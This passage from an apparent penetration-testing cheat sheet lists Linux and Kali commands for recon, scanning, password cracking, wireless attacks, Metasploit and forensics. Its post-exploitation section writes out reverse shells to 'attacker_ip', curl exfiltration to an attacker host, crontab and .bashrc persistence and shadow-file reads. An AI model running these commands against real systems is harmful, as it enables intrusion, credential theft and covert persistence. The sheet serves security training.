ps aux | awk '{print $1, $11}'          # User + Process name
netstat -tuln | awk '{print $4}'        # Local address
```

### `sed` — Stream Editor

```bash
# Replace
sed 's/old/new/' file.txt           # First occurrence replace
sed 's/old/new/g' file.txt          # Global replace
sed 's/old/new/gi' file.txt         # Case-insensitive global
sed -i 's/old/new/g' file.txt       # Modify the file directly in-place
sed -i.bak 's/old/new/g' file.txt   # Modify the file in-place and create a backup file

# Delete
sed '/pattern/d' file.txt           # Delete lines matching the pattern
sed '5d' file.txt                   # 5th line delete
sed '2,5d' file.txt                 # Line 2 to 5 delete
sed '/^$/d' file.txt                # Empty line delete
sed '/^#/d' file.txt                # Comment line delete

# Print specific line
sed -n '5p' file.txt                # 5th line print
sed -n '2,8p' file.txt              # Line 2 to 8
sed -n '/error/p' file.txt          # Pattern match line

# Insert/Append
sed '3i\New line' file.txt          # Insert a new line before the 3rd line
sed '3a\New line' file.txt          # Append a new line after the 3rd line
sed '/pattern/a\New line' file.txt  # Append a new line after lines matching the pattern

# Practical
sed 's/password/[REDACTED]/g' log.txt           # Sensitive data hide
sed '/^#/d' /etc/ssh/sshd_config | sed '/^$/d'  # Config without comments
```

### `cut`, `sort`, `uniq` — Filtering Utilities

```bash
# cut — Slice columns or characters
cut -d: -f1 /etc/passwd          # Extract field 1 using colon delimiter
cut -d: -f1,6 /etc/passwd        # Extract fields 1 and 6
cut -c1-10 file.txt              # Extract characters 1 to 10
cut -c5- file.txt                # Extract from character 5 to the end

# sort — sort data
sort file.txt                    # Alphabetical
sort -r file.txt                 # Reverse
sort -n numbers.txt              # Numeric sort
sort -rn numbers.txt             # Numeric reverse
sort -u file.txt                 # Unique sort
sort -t: -k3 -n /etc/passwd      # Field 3 numeric sort
sort -k1,1 -k2,2n file.txt       # Multi-column sort

# uniq — duplicate remove
uniq file.txt                    # Adjacent duplicate remove
sort file.txt | uniq             # Remove duplicate lines
sort file.txt | uniq -c          # Count line occurrences
sort file.txt | uniq -d          # Show duplicate lines only
sort file.txt | uniq -u          # Show unique lines only

# Practical combinations
cat /etc/passwd | cut -d: -f1 | sort                           # Sorted username list
cat access.log | awk '{print $1}' | sort | uniq -c | sort -rn  # Top IPs
cat passwords.txt | sort -u > unique_passwords.txt             # Removes duplicates, sorts and saves to a new file
```

### `tr`, `tee` — Redirects

```bash
# tr — character translate/delete
echo "hello" | tr 'a-z' 'A-Z'      # Lowercase → Uppercase
echo "HELLO" | tr 'A-Z' 'a-z'      # Uppercase → Lowercase
echo "hello world" | tr -d ' '     # Space delete
echo "hello" | tr -s 'l'           # Duplicate 'l' squeeze

# tee — Output to terminal and file simultaneously
nmap target | tee scan_result.txt  # Display on screen and save to file
command | tee -a file.txt          # Append output to file

# Redirect
command > output.txt               # Save output (overwrite)
command >> output.txt              # Save output (append)
command 2> error.txt               # Save errors only
command 2>&1 | tee output.txt      # Save output and errors together
command < input.txt                # Take input from file

# Pipe
command1 | command2 | command3     # Chain commands via pipe
cat /etc/passwd | grep root | awk -F: '{print $6}'  # View home directory of root user
```


## 16. Archive & Compression
> Bundle, compress and extract system files using archiving utilities

```bash
# tar (Tape Archive)
tar -cvf archive.tar folder/        # Create tar
tar -czvf archive.tar.gz folder/    # Create tar.gz (gzip)
tar -cjvf archive.tar.bz2 folder/   # Create tar.bz2 (bzip2)
tar -cJvf archive.tar.xz folder/    # Create tar.xz (xz)
tar -tvf archive.tar                # List content
tar -xvf archive.tar                # Extract
tar -xzvf archive.tar.gz            # Extract .tar.gz
tar -xvf archive.tar -C /tmp/       # Extract to a specific directory
tar -xvf archive.tar specific_file  # Specific file extract

# gzip
gzip file.txt                       # Compress file (deletes original)
gzip -k file.txt                    # Compress and keep original file
gzip -d file.txt.gz                 # Decompress file
gunzip file.txt.gz                  # Decompress file (same as gzip -d)
gzip -9 file.txt                    # Compress with maximum compression level
zcat file.txt.gz                    # View compressed file without extracting

# zip/unzip
zip archive.zip file1 file2         # Create zip
zip -r archive.zip folder/          # Recursive
zip -e secret.zip file.txt          # Password protected
unzip archive.zip                   # Extract
unzip archive.zip -d /tmp/          # Specific directory
unzip -l archive.zip                # List content
unzip -p archive.zip file.txt       # Specific file extract

# 7zip
7z a archive.7z folder/             # Create
7z x archive.7z                     # Extract
7z l archive.7z                     # List
7z a -p archive.7z file.txt         # Password protected
```


## 17. SSH & Remote Access
> Configure secure remote connections, manage SSH keys and access remote servers

```bash
# SSH Connection
ssh user@host                               # Basic connection
ssh user@192.168.1.100                      # Connect using IP
ssh -p 2222 user@host                       # Connect via custom port
ssh -i ~/.ssh/id_rsa user@host              # Connect using private key
ssh -v user@host                            # Run in verbose mode for debugging
ssh -X user@host                            # Enable X11 forwarding for GUI apps

# Generate SSH Keys
ssh-keygen -t rsa -b 4096                   # Generate 4096-bit RSA key
ssh-keygen -t ed25519                       # Generate modern Ed25519 key
ssh-keygen -t rsa -b 4096 -C "comment"      # Generate key with a comment
ssh-keygen -f /path/to/key                  # Save key with custom filename

# Copy public key to remote server
ssh-copy-id user@host                       # Copy default key
ssh-copy-id -i ~/.ssh/id_rsa.pub user@host  # Copy a specific key

# SSH Config file (~/.ssh/config)
cat > ~/.ssh/config << 'EOF'
Host myserver
    HostName 192.168.1.100
    User kali
    Port 22
    IdentityFile ~/.ssh/id_rsa
    
Host lab
    HostName 10.0.0.1
    User root
    Port 2222
EOF

# SSH Port Forwarding (Tunneling)
ssh -L 8080:localhost:80 user@host      # Forward local port 8080 to remote port 80
ssh -R 9090:localhost:3000 user@host    # Forward remote port 9090 to local port 3000
ssh -D 1080 user@host                   # Create dynamic SOCKS proxy on port 1080

# SCP — File copy over SSH
scp file.txt user@host:/tmp/            # Upload
scp user@host:/tmp/file.txt .           # Download
scp -r folder/ user@host:/tmp/          # Recursive
scp -P 2222 file.txt user@host:/tmp/    # Custom port

# SFTP
sftp user@host                          # Connect via SFTP
sftp> ls                                # List remote directory files
sftp> lls                               # List local directory files
sftp> put file.txt                      # Upload file to remote server
sftp> get file.txt                      # Download file to local machine
sftp> exit                              # Close SFTP connection

# rsync — Efficient file sync
rsync -avz folder/ user@host:/backup/   # Upload sync
rsync -avz user@host:/backup/ folder/   # Download sync
rsync -avz --delete folder/ backup/     # Delete extra files
rsync -avz --progress file user@host:/  # Show transfer progress

# Configure SSH Server
sudo nano /etc/ssh/sshd_config          # Edit SSH daemon configuration file
# Port 22                    → Change default port
# PermitRootLogin no         → Disable root login
# PasswordAuthentication no  → Disable password login (key only)
# PubkeyAuthentication yes   → Enable public key authentication
sudo systemctl restart ssh              # Restart SSH service to apply changes
```


## 18. Information Gathering
> Reconnaissance — Collect information about the target

### OSINT Tools

```bash
# theHarvester — Email, subdomain, IP collect
theHarvester -d example.com -b google              # Search using Google data source
theHarvester -d example.com -b all                 # Search using all available data sources
theHarvester -d example.com -b linkedin -l 500     # Search LinkedIn with a limit of 500 results

# Maltego — GUI OSINT tool
maltego                                            # Launch Maltego graphical user interface (GUI)

# Shodan — Internet-connected device search
shodan search "apache"                             # Search for devices running Apache
shodan host 1.2.3.4                                # View detailed information for an IP address
shodan count "nginx"                               # Count total search results for Nginx
# API key required: shodan init YOUR_API_KEY       # Initialize the Shodan API key

# recon-ng — Reconnaissance framework
recon-ng                                           # Start Recon-ng framework
> marketplace install all                          # Install all available modules
> modules search                                   # List installed modules
> modules load recon/domains-hosts/google_site_web # Load Google scraping module
> options set SOURCE example.com                   # Set target domain source
> run                                              # Execute module scan

# Google Dorking
site:example.com filetype:pdf                      # Find PDF files on a specific site
site:example.com inurl:admin                       # Find pages with "admin" in the URL
site:example.com intitle:"index of"                # Find exposed directory listings
inurl:"/phpmyadmin" "Welcome to phpMyAdmin"        # Find open phpMyAdmin login portals

# Whois & DNS
whois example.com                                  # Query domain registration data
dig example.com ANY                                # Fetch all available DNS records
dig +short MX example.com                          # List mail servers only
dig +trace example.com                             # Trace the entire delegation path
fierce --domain example.com                        # Perform DNS enumeration

# Sublist3r — Subdomain enumeration
sublist3r -d example.com                           # Enumerate subdomains via open sources
sublist3r -d example.com -b -p 80,443              # Enumerate using brute force and port scan

# amass — Advanced subdomain enumeration
amass enum -d example.com                          # Perform active DNS enumeration
amass enum -brute -d example.com                   # Brute-force subdomains
amass enum -passive -d example.com                 # Gather subdomains passively
```


## 19. Network Scanning (Nmap)
> Map target networks, discover active hosts and detect open ports

```bash
# Basic Scan
nmap target                        # Basic scan
nmap 192.168.1.1                   # IP scan
nmap 192.168.1.1-254               # Range scan
nmap 192.168.1.0/24                # Subnet scan
nmap scanme.nmap.org               # Domain scan

# Scan Types
nmap -sS target                    # SYN Scan (Stealth, default root)
nmap -sT target                    # TCP Connect Scan
nmap -sU target                    # UDP Scan
nmap -sA target                    # ACK Scan (firewall detect)
nmap -sN target                    # NULL Scan
nmap -sF target                    # FIN Scan
nmap -sX target                    # Xmas Scan
nmap -sP 192.168.1.0/24            # Ping Scan (host discovery)
nmap -sn 192.168.1.0/24            # Host discovery only

# Port Selection
nmap -p 80 target                  # Specific port
nmap -p 80,443,22 target           # Multiple ports
nmap -p 1-1000 target              # Range
nmap -p- target                    # Scan all 65,535 ports
nmap --top-ports 100 target        # Top 100 port
nmap -F target                     # Fast scan (top 100)

# Service & Version Detection
nmap -sV target                        # Service version
nmap -sV --version-intensity 9 target  # Aggressive version
nmap -O target                         # OS detection
nmap -A target                         # Aggressive: -sV -O + scripts + traceroute

# Script Scanning (NSE)
nmap -sC target                    # Default scripts
nmap --script=banner target        # Banner grab
nmap --script=http-title target    # HTTP title
nmap --script=vuln target          # Vulnerability check
nmap --script=smb-vuln* target     # SMB vulnerabilities
nmap --script=ftp-anon target      # FTP anonymous login
nmap --script=ssh-brute target     # SSH brute force
nmap --script=dns-brute --script-args dns-brute.domain=example.com target

# Output Formats
nmap -oN result.txt target         # Normal output
nmap -oX result.xml target         # XML output
nmap -oG result.grep target        # Grepable output
nmap -oA result target             # Save output in all formats (result.nmap, .xml, .gnmap)

# Timing & Performance
nmap -T0 target                    # Paranoid (slowest, stealthiest)
nmap -T1 target                    # Sneaky
nmap -T2 target                    # Polite
nmap -T3 target                    # Normal (default)
nmap -T4 target                    # Aggressive (fast)
nmap -T5 target                    # Insane (fastest, noisy)

# Evasion
nmap -f target                     # Fragment packets
nmap --mtu 24 target               # Custom MTU
nmap -D decoy1,decoy2,ME target    # Decoy IP
nmap -S spoofed_ip target          # Spoof source IP
nmap -e eth0 target                # Specific interface
nmap --randomize-hosts target      # Random order

# Practical Examples
nmap -sS -sV -O -p- -T4 target                 # Comprehensive scan
nmap -sU -p 53,67,68,69,123 target             # Common UDP services
nmap -sV --script=vuln 192.168.1.0/24          # Network vulnerability scan
nmap -p 445 --script=smb-security-mode target  # SMB security check
```


## 20. Vulnerability Scanning
> Audit targets, detect open flaws and identify security vulnerabilities

```bash
# Nikto — Web server vulnerability scanner
nikto -h http://target.com              # Scan target.com
nikto -h http://target.com -p 8080      # Custom port
nikto -h http://target.com -o result.txt -Format txt
nikto -h http://target.com -ssl         # HTTPS
nikto -h http://target.com -Tuning x    # Specific tests
nikto -h target -C all                  # All CGI

# OpenVAS — Comprehensive vulnerability scanner
sudo gvm-setup                          # Setup
sudo gvm-start                          # Start
# Browser: https://127.0.0.1:9392

# WPScan — WordPress vulnerability scanner
wpscan --url http://target.com                    # Set the target
wpscan --url http://target.com --enumerate u      # User enumerate
wpscan --url http://target.com --enumerate p      # Plugin
wpscan --url http://target.com --enumerate t      # Theme
wpscan --url http://target.com -P wordlist.txt    # Password attack
wpscan --url http://target.com --api-token TOKEN  # WPVulnDB

# Lynis — System security auditing
sudo lynis audit system                 # Full system audit
sudo lynis audit system --quick         # Quick mode

# Searchsploit — CVE/exploit search (local)
searchsploit apache 2.4                 # Search for Apache 2.4 exploits
searchsploit -t "remote execution"      # Search by exploit title
searchsploit windows smb                # Search for Windows SMB exploits
searchsploit -x 44556                   # View exploit contents
searchsploit -m 44556                   # Copy exploit to current directory
searchsploit --cve 2021-44228           # Search by CVE identifier
```


## 21. Web Application Testing
> Scan web targets, test endpoints and detect application-layer flaws

```bash
# Directory/File Enumeration
gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt # Scan directories with default wordlist
gobuster dir -u http://target.com -w wordlist.txt -x php,html,txt         # Scan specific extensions
gobuster dir -u http://target.com -t 50 -o results.txt                    # Scan with 50 threads and save output
gobuster dns -d example.com -w wordlist.txt                               # Brute-force subdomains via DNS

dirb http://target.com                                                    # Default directory scan
dirb http://target.com /usr/share/wordlists/dirb/big.txt                  # Scan with custom wordlist
dirsearch -u http://target.com                                            # Fast directory scan
dirsearch -u http://target.com -e php,asp,aspx,html                       # Scan specific extensions

# Feroxbuster (Rust-based, fast)
feroxbuster -u http://target.com                                          # Fast directory brute-force

# SQLMap — SQL Injection automated
sqlmap -u "http://target.com/page?id=1"                                   # Scan URL for SQLi
sqlmap -u "http://target.com/page?id=1" --dbs                             # List databases
sqlmap -u "http://target.com/page?id=1" -D dbname --tables                # List tables
sqlmap -u "http://target.com/page?id=1" -D dbname -T users --columns      # List columns
sqlmap -u "http://target.com/page?id=1" -D dbname -T users --dump         # Dump table data
sqlmap -u "http://target.com" --data="username=admin&pass=1"              # Scan POST request
sqlmap -u "http://target.com" --cookie="PHPSESSID=abc"                    # Scan with session cookie
sqlmap -u "http://target.com" --level=5 --risk=3                          # Aggressive deep scan
sqlmap -u "http://target.com" --os-shell                                  # Open interactive OS shell

# XSS Testing
# Manual payloads:
# <script>alert(1)</script>
# "><img src=x onerror=alert(1)>
# javascript:alert(1)

# Burp Suite (GUI) — Proxy + Interceptor
burpsuite &                      # Launch

# whatweb — Web technology fingerprint
whatweb http://target.com        # Identify web technologies
whatweb -a 3 http://target.com   # Aggressive technology scan

# wafw00f — WAF detection
wafw00f http://target.com        # Detect Web Application Firewall (WAF)

# SSLScan — SSL/TLS analysis
sslscan target.com              # Scan SSL/TLS cipher suites
sslyze target.com               # Analyze SSL/TLS configuration details

# curl — Manual HTTP testing
curl -v http://target.com                                       # Verbose mode (view request and response headers)
curl -X POST http://target.com/login -d "user=admin&pass=test"  # Send a POST request with data
curl -b "cookie=value" http://target.com                        # Send a request with a cookie
curl -H "X-Forwarded-For: 127.0.0.1" http://target.com          # Add a custom HTTP header
curl --proxy http://127.0.0.1:8080 http://target.com            # Route traffic through Burp Suite proxy
```


## 22. Password Attacks
> Audit credential strength, crack hashes and test brute-force password resilience

```bash
# Wordlist location
ls /usr/share/wordlists/                 # List available wordlist directories
ls /usr/share/wordlists/rockyou.txt.gz   # Check if RockYou archive exists

# Extract the RockYou wordlist
sudo gunzip /usr/share/wordlists/rockyou.txt.gz  # Extract RockYou compressed file

# John the Ripper — Password cracker
john hash.txt                            # Auto detect + crack
john --wordlist=rockyou.txt hash.txt     # Wordlist attack
john --rules hash.txt                    # Rule-based
john --incremental hash.txt              # Brute force (slow)
john --show hash.txt                     # View cracked password
john --format=md5 hash.txt               # Specific format

# Identify hash
john --list=formats                      # Supported format
hashid '$6$salt$hash'                    # Hash type identify
hash-identifier                          # Interactive

# Hashcat — GPU-accelerated cracker
hashcat -m 0 hash.txt rockyou.txt        # MD5
hashcat -m 1000 hash.txt rockyou.txt     # NTLM
hashcat -m 1800 hash.txt rockyou.txt     # SHA512crypt (Linux)
hashcat -m 3200 hash.txt rockyou.txt     # bcrypt
hashcat -a 0 hash.txt wordlist.txt       # Dictionary attack
hashcat -a 3 hash.txt ?a?a?a?a           # Brute force (4 char)
hashcat -a 6 hash.txt wordlist.txt ?d?d  # Hybrid
hashcat --show hash.txt                  # Show cracked

# Hashcat mask characters:
# ?l = lowercase (a-z)
# ?u = uppercase (A-Z)
# ?d = digit (0-9)
# ?s = special chars
# ?a = all

# Hydra — Online brute force
hydra -l admin -P rockyou.txt ssh://192.168.1.1             # SSH
hydra -l admin -P rockyou.txt ftp://192.168.1.1             # FTP
hydra -l admin -P rockyou.txt http-get://192.168.1.1/admin  # HTTP Basic
hydra -L users.txt -P rockyou.txt 192.168.1.1ssh            # User list
hydra -l admin -P rockyou.txt 192.168.1.1 http-post-form "/login:user=^USER^&pass=^PASS^:Invalid"
hydra -t 64 -l admin -P rockyou.txt ssh://target            # 64 threads

# Medusa
medusa -h target -u admin -P rockyou.txt -M ssh             # Brute-force SSH credentials
medusa -h target -u admin -P rockyou.txt -M ftp             # Brute-force FTP credentials

# Crunch — Custom wordlist generate
crunch 6 8 abcdefghijklmnopqrstuvwxyz > wordlist.txt        # 6-8 char
crunch 4 4 0123456789 > pins.txt                            # 4-digit PIN
crunch 8 8 -t Polas@@@ > custom.txt                         # Pattern

# CeWL — Create wordlist from website
cewl http://target.com -w wordlist.txt                      # Scrape website words to file
cewl http://target.com -d 3 -m 5 -w wordlist.txt            # Scrape with depth and min length
```


## 23. Wireless Attacks
> Audit Wi-Fi security, capture handshakes and test wireless network resilience

```bash
# Check wireless interface
iwconfig                           # View wireless interfaces
ip link show                       # View all network interfaces

# Enable monitor mode
sudo airmon-ng start wlan0         # Monitor mode
sudo airmon-ng stop wlan0mon       # Stop
sudo airmon-ng check kill          # Interfering process kill

# Network scan
sudo airodump-ng wlan0mon                                            # Scan all wireless networks
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon  # Capture traffic from specific AP

# Deauthentication attack (Disconnect client)
sudo aireplay-ng -0 10 -a BSSID -c CLIENT_MAC wlan0mon               # 10 deauth packet

# WPA/WPA2 Handshake Capture
# 1. Start capture with airodump
# 2. Disconnect client with aireplay
# 3. Capture handshake upon reconnection
# 4. Crack hash with aircrack

# Aircrack — WPA crack
aircrack-ng capture.cap -w rockyou.txt

# WPA crack with Hashcat (faster)
hcxdumptool -o capture.pcapng -i wlan0mon     # Capture raw wireless traffic
hcxpcapngtool -o hash.hc22000 capture.pcapng  # Convert pcapng to Hashcat format
hashcat -m 22000 hash.hc22000 rockyou.txt     # Crack WPA hash using wordlist

# WPS Attack
wash -i wlan0mon                              # Find WPS enabled APs
reaver -i wlan0mon -b BSSID -vv               # Brute-force WPS PIN
bully wlan0mon -b BSSID -d -v 3               # Alternative WPS attack

# Evil Twin / Rogue AP
hostapd-wpe config_file                       # Create rogue AP

# Wifite — Automated wireless attack
sudo wifite                                   # Auto scan + attack
sudo wifite --wpa --wps                       # WPA + WPS
```


## 24. Exploitation (Metasploit)
> Launch exploits, manage active payloads and test system vulnerability targets

```bash
# Start Metasploit
sudo systemctl start postgresql       # Start database (required)
sudo msfdb init                       # Initialize database
msfconsole                            # Start Metasploit console
msfconsole -q                         # Start in quiet mode (without banner)

# Basic Commands
msf6 > help                           # Display help menu
msf6 > search eternalblue             # Search for exploit
msf6 > search type:exploit name:smb   # Filter by type and name
msf6 > search cve:2021-44228          # Search by CVE number
msf6 > info exploit/windows/smb/ms17_010_eternalblue  # View module information
msf6 > use exploit/windows/smb/ms17_010_eternalblue   # Select exploit module
msf6 > show options                   # View required options
msf6 > set RHOSTS 192.168.1.100       # Set target host IP
msf6 > set LHOST 192.168.1.50         # Set local listener IP
msf6 > set LPORT 4444                 # Set local listener port
msf6 > set PAYLOAD windows/meterpreter/reverse_tcp    # Set specific payload
msf6 > show payloads                  # View compatible payloads
msf6 > check                          # Check if target is vulnerable
msf6 > run                            # Execute the exploit
msf6 > exploit                        # Execute the exploit (alias)

# Meterpreter (Post Exploitation)
meterpreter > help                    # Commands
meterpreter > sysinfo                 # System info
meterpreter > getuid                  # Current user
meterpreter > getpid                  # Current process ID
meterpreter > ps                      # Process list
meterpreter > shell                   # Command shell
meterpreter > upload file.txt C:\\    # File upload
meterpreter > download C:\\file.txt . # File download
meterpreter > ls                      # Directory list
meterpreter > pwd                     # Current directory
meterpreter > cd C:\\Users            # Directory change
meterpreter > screenshot              # Take a screenshot
meterpreter > hashdump                # Dump password hashes
meterpreter > run post/windows/gather/credentials/credential_collector # Collect system credentials
meterpreter > migrate PID             # Migrate to a different process
meterpreter > getsystem               # Elevate privileges to SYSTEM
meterpreter > background              # Send session to background
meterpreter > exit                    # Exit session

# Manage sessions
msf6 > sessions                       # List all active sessions
msf6 > sessions -i 1                  # Interact with session 1
msf6 > sessions -k 1                  # Terminate session 1

# Auxiliary modules
msf6 > use auxiliary/scanner/portscan/tcp      # Port scan
msf6 > use auxiliary/scanner/smb/smb_ms17_010  # SMB vuln check
msf6 > use auxiliary/scanner/ftp/ftp_login     # FTP brute

# MSFVenom — Generate payloads and shellcode
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f exe > shell.exe    # Generate Windows executable payload
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f elf > shell.elf  # Generate Linux executable payload
msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f raw > shell.php        # Generate raw PHP script payload
msfvenom -p java/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f war > shell.war       # Generate Java Web Archive payload
msfvenom -l payloads                                                                            # List all available payloads
msfvenom -l formats                                                                             # List all available output formats

# Handler setup (to receive connections from payloads)
msf6 > use exploit/multi/handler                         # Select multi-handler exploit module
msf6 > set PAYLOAD windows/meterpreter/reverse_tcp       # Set matching payload type
msf6 > set LHOST 0.0.0.0                                 # Listen on all local interfaces
msf6 > set LPORT 4444                                    # Set incoming listener port
msf6 > run -j                                            # Execute the handler in the background
```


## 25. Post Exploitation
> Gather system intelligence, maintain persistent access and elevate local system privileges

```bash
# Netcat — Swiss Army Knife
nc -lvnp 4444                     # Listen (our machine)
nc -e /bin/bash target 4444       # Connect + shell send
nc target 4444                    # Connect to a target port
nc -lvnp 4444 > received.txt      # File receive
nc target 4444 < file.txt         # File send

# Reverse Shell (Execute on target machine)
bash -i >& /dev/tcp/attacker_ip/4444 0>&1 # Spawn an interactive Bash reverse shell
# Spawn a Python-based reverse shell
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("attacker_ip",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])' 
php -r '$sock=fsockopen("attacker_ip",4444);exec("/bin/bash -i <&3 >&3 2>&3");' # Spawn a PHP-based reverse shell

# Shell Upgrade (Convert standard shell to interactive)
python3 -c 'import pty; pty.spawn("/bin/bash")' # Spawn a fully interactive PTY shell
export TERM=xterm                               # Set terminal environment type
# Ctrl+Z (Send current shell session to background)
stty raw -echo; fg                              # Pass terminal controls and foreground the session
# Enter

# Privilege Escalation Check
sudo -l                               # View allowed sudo permissions
cat /etc/sudoers                      # Sudoers file
find / -perm -4000 2>/dev/null        # SUID files
find / -perm -2000 2>/dev/null        # SGID files
find / -writable -type f 2>/dev/null  # Writable files
cat /etc/crontab                      # Cron jobs
ls -la /etc/cron*                     # Cron directories
cat /etc/passwd | grep -v nologin     # Users
cat /etc/shadow                       # Password hashes (if readable)
env                                   # Environment variables
cat ~/.bash_history                   # Command history
find / -name "*.conf" 2>/dev/null     # Config files

# LinPEAS — Automated Linux PE check
curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh
# or
chmod +x linpeas.sh && ./linpeas.sh   # Make script executable and run local privilege escalation check

# Data Exfiltration
tar -czf data.tar.gz /etc/ 2>/dev/null              # Compress directory into an archive
base64 data.tar.gz                                  # Convert archive to Base64 format
curl -F "file=@data.tar.gz" http://attacker/upload  # Send file via HTTP POST request

# Persistence
# Add a cron job
echo "* * * * * /bin/bash -i >& /dev/tcp/attacker/4444 0>&1" | crontab - # Set scheduled task for remote execution
# Add to .bashrc file
echo "bash -i >& /dev/tcp/attacker/4444 0>&1" >> ~/.bashrc               # Configure execution upon user login
```


## 26. Forensics & Reverse Engineering
> Analyze binary files, extract digital evidence and reverse-engineer compiled malware targets

```bash
# File Analysis
file suspicious.exe               # File type determine
strings suspicious.exe            # Printable string extract
strings -n 8 file.bin             # Min 8 char string
hexdump -C file.bin | head        # Hex dump
xxd file.bin                      # Hex dump (colorful)
xxd -r hex.txt binary.bin         # Hex → Binary

# Metadata
exiftool image.jpg                # Image metadata
exiftool -all= image.jpg          # Metadata remove
exiv2 image.jpg                   # Alternative
mediainfo video.mp4               # Media file info

# Hash Verification
md5sum file.txt                   # Calculate MD5 hash of the file
sha1sum file.txt                  # Calculate SHA1 hash of the file
sha256sum file.txt                # Calculate SHA256 hash of the file
sha512sum file.txt                # Calculate SHA512 hash of the file
md5sum -c checksums.md5           # Verify files against MD5 checksum list

# Disk Forensics
sudo autopsy &                                        # Start Autopsy GUI in the background (browser-based)
sudo fdisk -l                                         # View available disks and partitions
sudo dd if=/dev/sda of=disk.img                       # Create a forensic copy (disk image)
sudo dd if=/dev/sda of=disk.img bs=4M status=progress # Create a disk image with speed optimization and progress bar
dcfldd if=/dev/sda of=disk.img hash=md5               # Create a disk image alongside on-the-fly MD5 hashing
sudo mount -o ro disk.img /mnt/                       # Mount the image in secure read-only mode

# Volatility — Memory forensics
volatility -f memory.dmp imageinfo                    # Detect OS profile
volatility -f memory.dmp --profile=Win10 pslist       # Process list
volatility -f memory.dmp --profile=Win10 netscan      # Network connections
volatility -f memory.dmp --profile=Win10 hashdump     # Password hash
volatility -f memory.dmp --profile=Win10 cmdline      # Command history

# Steganography
steghide embed -cf image.jpg -sf secret.txt           # Hide file inside image
steghide extract -sf image.jpg                        # Extract hidden file
stegoveritas image.jpg                                # Analyze image metadata
zsteg image.png                                       # Detect PNG steganography
binwalk image.jpg                                     # Scan embedded files
binwalk -e image.jpg                                  # Extract embedded files

# Network Forensics
wireshark capture.pcap            # GUI packet analysis
tshark -r capture.pcap            # CLI
tshark -r capture.pcap -T fields -e ip.src -e ip.dst  # Specific fields
tshark -r capture.pcap "http"     # Filter
tcpdump -i eth0 -w capture.pcap   # Live capture
tcpdump -i eth0 port 80           # HTTP traffic
tcpdump -i eth0 host 192.168.1.1  # Specific host

# Reverse Engineering
gdb binary                        # GNU Debugger
gdb binary -q                     # Quiet mode
(gdb) run                         # Run
(gdb) break main                  # Breakpoint
(gdb) disassemble main            # Disassemble
objdump -d binary | head -50      # Disassemble
ltrace binary                     # Library call trace
strace binary                     # System call trace
radare2 binary                    # Advanced RE framework
r2 binary                         # Open binary in radare2
r2 -d binary                      # Debug binary
r2 -w binary                      # Patch binary
rabin2 -I binary                  # View binary info
[0x00]> aaa                       # Analyze all
[0x00]> pdf @ main                # Disassemble main
```


## 27. Scripting & Automation
> Build shell scripts, automate repetitive workflows and schedule routine tasks

### Bash Scripting

```bash
# Create script
#!/bin/bash
# File: myscript.sh

# Variable
NAME="Polas"
AGE=25
echo "Hello, $NAME! You are $AGE years old."

# Get Input
read -p "Enter target IP: " TARGET
echo "Scanning $TARGET..."

# Conditional
if [ "$TARGET" == "" ]; then
    echo "No target specified!"
    exit 1
elif ping -c 1 "$TARGET" &>/dev/null; then
    echo "Host is UP"
else
    echo "Host is DOWN"
fi

# Loop
for IP in 192.168.1.{1..254}; do
    ping -c 1 -W 1 "$IP" &>/dev/null && echo "$IP is UP"
done

# While loop
COUNT=0
while [ $COUNT -lt 5 ]; do
    echo "Count: $COUNT"
    ((COUNT++))
done

# Function
scan_target() {
    local target=$1
    local port=$2
    echo "Scanning $target:$port"
    nmap -p "$port" "$target"
}
scan_target "192.168.1.1" "80,443"

# Array
TARGETS=("192.168.1.1" "192.168.1.2" "192.168.1.3")
for target in "${TARGETS[@]}"; do
    echo "Scanning: $target"
done

# Error handling
set -e                                  # Exit immediately if any command fails
set -u                                  # Exit if an unreferenced variable is used
trap 'echo "Error on line $LINENO"' ERR # Execute specific action upon command errors

# Script permission
chmod +x myscript.sh                    # Make script file executable
./myscript.sh                           # Run the script directly
bash myscript.sh                        # Run the script using Bash explicitly

# Practical: Port Scanner Script
#!/bin/bash
TARGET=$1
echo "Port scanning $TARGET"
for PORT in {1..1024}; do
    (echo >/dev/tcp/$TARGET/$PORT) 2>/dev/null && \
        echo "Port $PORT is OPEN"
done
```

### Useful One-Liners

```bash
# Discover live host
for i in {1..254}; do ping -c 1 -W 1 192.168.1.$i | grep "bytes from" &; done; wait

# Scan open port
for port in {1..65535}; do (echo >/dev/tcp/target/$port) 2>/dev/null && echo "$port open"; done

# Search web server
nmap -p 80,443 192.168.1.0/24 --open | grep "Nmap scan report"

# Extract all password hashes
cat /etc/shadow | cut -d: -f1,2 | grep -v "!"

# List all network listening services
ss -tulnp | awk 'NR>1 {print $5, $7}'

# Search large file
find / -type f -size +100M 2>/dev/null | sort -k5 -rn

# Search setuid file (PE vector)
find / -perm -u=s -type f 2>/dev/null

# Extract failed logins from logs
grep "Failed password" /var/log/auth.log | awk '{print $11}' | sort | uniq -c | sort -rn

# Base64 encode/decode
echo "secret text" | base64          # Encode text to Base64
echo "c2VjcmV0IHRleHQK" | base64 -d  # Decode Base64 string back to text

# URL encode
python3 -c "import urllib.parse; print(urllib.parse.quote('hello world'))"

# Hash generate
echo -n "password" | md5sum         # Generate MD5 hash of string
echo -n "password" | sha256sum      # Generate SHA256 hash of string
```


## 28. Environment & System Info
> Check core system hardware, active kernel versions and shell environment variables

```bash
# Environment variables
env                              # View all env variables
printenv                         # View all env variables
echo $PATH                       # View current PATH
echo $HOME                       # Home directory
echo $USER                       # Current user
echo $SHELL                      # Current shell

# Set variable
export MY_VAR="value"                           # Current session
echo 'export MY_VAR="value"' >> ~/.bashrc       # Permanent

# Add PATH
export PATH=$PATH:/new/path                     # Update PATH temporarily for current session
echo 'export PATH=$PATH:/new/path' >> ~/.bashrc # Update PATH permanently for all future sessions

# System resource
free -h                          # RAM
vmstat                           # Virtual memory stats
iostat                           # Disk I/O stats
mpstat                           # CPU stats
sar -u 5 10                      # CPU every 5s, 10 times

